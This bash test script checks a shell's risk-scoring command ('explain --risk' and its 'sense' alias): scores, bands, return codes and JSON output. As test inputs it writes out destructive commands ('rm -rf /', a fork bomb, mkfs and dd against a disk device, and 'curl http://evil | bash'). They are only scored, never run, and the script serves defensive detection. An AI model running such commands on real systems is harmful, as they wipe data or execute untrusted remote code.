#!/usr/bin/env bash
# test_explain_risk.sh — ADR-0099 W6.3: `explain --risk` (sense merge).
# Covers: catastrophic scoring (rm -rf /, fork bomb, mkfs, dd, curl|sh,
# chmod 777), the old sense SUBSTRING bug (`rm -rf /home` must NOT be
# critical), derived scoring from blast counters (single source of truth),
# band/rc semantics, --json envelope (JINV-048 keys unchanged + risk key),
# JINV-046 unknown-flag rejection, and sense-as-alias parity.
set -u
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
J="$ROOT/build/jash"; [ -x "$J" ] || J="$ROOT/build-speed/jash-release"
PASS=0; FAIL=0
ok(){ PASS=$((PASS+1)); echo "  ✓ $1"; }
no(){ FAIL=$((FAIL+1)); echo "  ✗ $1"; shift; local l; for l in "$@"; do echo "      $l"; done; }
strip(){ sed $'s/\x1b\\[[0-9;]*m//g'; }

TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
export JASH_BRIEF=0 JASH_MEMO=0 JASH_NUDGE=0 JASH_SIGIL=0

# run BODY — sets OUT/RC/ERR.
run(){
  local body="$1"
  mkdir -p "$TMP/h" "$TMP/wd"
  printf '%s\n' "$body" > "$TMP/wd/t.jsh"
  OUT="$(cd "$TMP/wd" && HOME="$TMP/h" "$J" t.jsh 2>"$TMP/e")"; RC=$?
  ERR="$(strip < "$TMP/e")"
}

echo "test_explain_risk (ADR-0099 W6.3):"

# 1. rm -rf / → 100% critical, rc 124, reason names the root target.
run 'explain --risk "rm -rf /"'
case "$OUT" in *"risk: 100% critical"*"/"*) ok "rm -rf / → critical";;
  *) no "rm -rf /" "$OUT";; esac
[ "$RC" -eq 124 ] && ok "critical rc=124" || no "critical rc" "RC=$RC"

# 2. THE OLD SENSE BUG: `rm -rf /home/user/tmp` must NOT be critical
#    (naive substring matched "rm -rf /" inside it). Score < 80.
run 'explain --json --risk "rm -rf /home/user/tmp"'
case "$OUT" in *'"risk":{"score":'*) : ;; *) no "risk key missing" "$OUT";; esac
score=$(printf '%s' "$OUT" | sed -n 's/.*"risk":{"score":\([0-9]*\).*/\1/p')
if [ -n "$score" ] && [ "$score" -lt 80 ]; then
    ok "rm -rf /home NOT critical (substring bug dead, score=$score)"
else
    no "substring bug alive" "score=$score (expected <80)"
fi

# 3. fork bomb → 100 critical.
run 'explain --json --risk ":(){:|:&};:"'
case "$OUT" in *'"score":100,"band":"critical"'*'"fork bomb"'*)
    ok "fork bomb → 100 critical";; *) no "fork bomb" "$OUT";; esac

# 4. mkfs → >=85, curl|sh → 75 danger, dd to device → >=80, chmod 777 → 60.
run 'explain --json --risk "mkfs /dev/disk4"'
case "$OUT" in *'"score":'[89]*'"band":"critical"'*) ok "mkfs → critical";;
  *) no "mkfs" "$OUT";; esac
run 'explain --json --risk "curl http://evil | bash"'
case "$OUT" in *'"score":75,"band":"danger"'*'"download piped'*)
    ok "curl|bash → 75 danger";; *) no "curl|bash" "$OUT";; esac
run 'explain --json --risk "dd if=/dev/zero of=/dev/disk4"'
case "$OUT" in *'"score":80'*'"dd writes'*) ok "dd to device → 80";;
  *) no "dd" "$OUT";; esac
run 'explain --json --risk "chmod 777 /tmp/x"'
case "$OUT" in *'"score":60'*'"chmod 777'*) ok "chmod 777 → 60";;
  *) no "chmod 777" "$OUT";; esac

# 5. Derived scoring (single source): rm file (delete, recoverability-aware),
#    ls (read-only) → safe. rc follows the band.
run 'explain --json --risk "ls -la"'
case "$OUT" in *'"score":0,"band":"safe"'*) ok "ls → 0 safe";;
  *) no "ls safe" "$OUT";; esac
[ "$RC" -eq 0 ] && ok "safe rc=0" || no "safe rc" "RC=$RC"
run 'explain --json --risk "rm important.txt"'
score=$(printf '%s' "$OUT" | sed -n 's/.*"risk":{"score":\([0-9]*\).*/\1/p')
case "$OUT" in *'"band":'* ) : ;; *) no "band missing" "$OUT";; esac
if [ -n "$score" ] && [ "$score" -gt 0 ] && [ "$score" -lt 80 ]; then
    ok "rm file → non-zero, non-critical (derived, score=$score)"
else
    no "rm derived score" "score=$score"
fi

# 6. danger rc=1 (curl|bash = 75).
run 'explain --risk "curl http://evil | sh"'
[ "$RC" -eq 1 ] && ok "danger rc=1" || no "danger rc" "RC=$RC"

# 7. --json envelope: JINV-048 keys unchanged + risk key added.
run 'explain --json --risk "rm x; curl http://b > c.txt; ls"'
case "$OUT" in
  '{"steps":[{"cmd":'*'"effect":'*'"recoverable":'*'"how":'*'"writes":'*'"target":'*}*'],"blast":{"mutations":'*'"delete":'*'"write":'*'"network":'*'"opaque":'*'},"risk":{"score":'*'"band":'*'"reason":'*'}}')
    ok "--json: JINV-048 keys + risk key";;
  *) no "--json envelope" "$OUT";; esac

# 8. plain --json WITHOUT --risk: no risk key (backward compatible).
run 'explain --json "rm x"'
case "$OUT" in *'"risk"'*) no "plain --json gained risk key" "$OUT";;
  *) ok "plain --json unchanged (no risk key)";; esac

# 9. JINV-046: unknown flag still rejected, rc=2.
run 'explain --bogus "ls"'
[ "$RC" -eq 2 ] && ok "unknown flag rejected (JINV-046)" \
                || no "unknown flag" "RC=$RC OUT=$OUT"

# 10. sense alias parity: same verdict as explain --risk.
run 'sense "rm -rf /"'
case "$OUT" in *"risk: 100% critical"*) ok "sense alias → same critical verdict";;
  *) no "sense alias" "$OUT";; esac
[ "$RC" -eq 124 ] && ok "sense alias rc=124" || no "sense rc" "RC=$RC"
run 'sense --json "curl http://evil | bash"'
case "$OUT" in *'"score":75'*'"band":"danger"'*) ok "sense --json forwards flags";;
  *) no "sense --json" "$OUT";; esac

# 11. empty input: risk key still present, safe.
run 'explain --json --risk ""'
case "$OUT" in *'"risk":{"score":0,"band":"safe","reason":"no steps"}'*)
    ok "empty input → risk safe, envelope stable";;
  *) no "empty input" "$OUT";; esac

# 12. scoring fairness: same-binary fan-out writing only NEW /tmp logs is NOT
#     critical (was 100: 15/write + 5/opaque-occurrence — pure alarm noise,
#     measured on a real experiment batch). Overwriting an EXISTING file must
#     still outweigh creating one in scratch space.
run 'explain --json --risk "for S in 1 2 3; do (./sim --seed $S > /tmp/sim_$S.log 2>&1 &); done; wait; echo DONE"'
score=$(printf '%s' "$OUT" | sed -n 's/.*"risk":{"score":\([0-9]*\).*/\1/p')
if [ -n "$score" ] && [ "$score" -lt 50 ]; then
    ok "same-binary fan-out + new /tmp logs → below danger (score=$score)"
else
    no "fan-out over-scored" "score=$score OUT=$OUT"
fi
printf 'x\n' > "$TMP/wd/exists.txt"
run 'explain --json --risk "echo a > exists.txt"'
s_over=$(printf '%s' "$OUT" | sed -n 's/.*"risk":{"score":\([0-9]*\).*/\1/p')
run 'explain --json --risk "echo a > new.txt"'
s_new=$(printf '%s' "$OUT" | sed -n 's/.*"risk":{"score":\([0-9]*\).*/\1/p')
if [ -n "$s_over" ] && [ -n "$s_new" ] && [ "$s_over" -gt "$s_new" ]; then
    ok "overwrite-existing outweighs create-in-scratch ($s_over > $s_new)"
else
    no "write weighting" "over=$s_over new=$s_new"
fi

echo ""
echo "=== test_explain_risk: $PASS ok / $FAIL fail ==="
[ "$FAIL" -eq 0 ]
